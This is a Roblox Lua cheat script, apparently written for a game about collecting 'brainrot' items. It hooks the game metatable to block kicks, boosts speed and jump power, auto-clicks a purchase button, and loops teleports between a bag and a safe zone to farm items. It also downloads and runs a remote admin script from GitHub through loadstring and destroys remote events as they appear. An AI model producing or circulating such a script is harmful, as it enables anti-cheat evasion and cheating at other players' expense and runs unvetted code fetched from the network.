local mt = getrawmetatable(game)
setreadonly(mt, false)
local nc = mt.__namecall
mt.__namecall = newcclosure(function(self, ...)
    if getnamecallmethod() == "Kick" then return end
    return nc(self, ...)
end)

game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 75
game.Players.LocalPlayer.Character.Humanoid.JumpPower = 110

spawn(function()
    while wait(3) do
        local btn = workspace:FindFirstChild("BrainrotBuy")
        if btn then fireclickdetector(btn.ClickDetector) end
    end
end)

spawn(function()
    while wait(2) do
        local brain = workspace:FindFirstChild("BrainrotBag")
        local base = workspace:FindFirstChild("SafeZone")
        if brain and base then
            game.Players.LocalPlayer.Character:PivotTo(brain.CFrame)
            wait(1)
            game.Players.LocalPlayer.Character:PivotTo(base.CFrame)
        end
    end
end)

loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()

game.DescendantAdded:Connect(function(v)
    if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
        v:Destroy()
    end
end)
